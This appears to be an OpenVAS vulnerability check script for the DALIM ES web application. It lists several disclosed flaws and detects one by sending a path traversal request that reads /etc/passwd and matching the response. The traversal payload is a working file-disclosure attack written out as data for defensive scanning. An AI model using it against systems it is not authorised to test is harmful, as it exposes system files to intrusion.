###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dalim_es_mult_vuln.nasl 7127 2017-09-14 08:36:48Z cfischer $
#
# DALIM ES Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:dalim:es_core";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140293");
  script_version("$Revision: 7127 $");
  script_tag(name: "last_modification", value: "$Date: 2017-09-14 10:36:48 +0200 (Thu, 14 Sep 2017) $");
  script_tag(name: "creation_date", value: "2017-08-11 16:04:25 +0700 (Fri, 11 Aug 2017)");
  script_tag(name: "cvss_base", value: "7.8");
  script_tag(name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_tag(name: "qod_type", value: "exploit");

  script_tag(name: "solution_type", value: "NoneAvailable");

  script_name("DALIM ES Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dalim_es_detect.nasl");
  script_mandatory_keys("dalim_es/installed");

  script_tag(name: "summary", value: "DALIM ES is prone to multiple vulnerabilities.");

  script_tag(name: "insight", value: "DALIM ES is prone to multiple vulnerabilities:

- User Enumeration Weakness

- Multiple Stored XSS And CSRF Vulnerabilities

- Multiple Remote File Disclosures

- Server-Side Request Forgery");

  script_tag(name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response.");

  script_tag(name: "solution", value: "No solution or patch is available as of 14th September, 2017. Information
regarding this issue will be updated once the solution details are available.");

  script_xref(name: "URL", value: "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5428.php");
  script_xref(name: "URL", value: "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5427.php");
  script_xref(name: "URL", value: "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5426.php");
  script_xref(name: "URL", value: "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5425.php");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

url = "/Esprit/public/Password.jsp?orgName=../../../../../../../../../etc/passwd";

if (http_vuln_check(port: port, url: url, pattern: "root:.*:0:[01]:", check_header: TRUE, debug: TRUE)) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
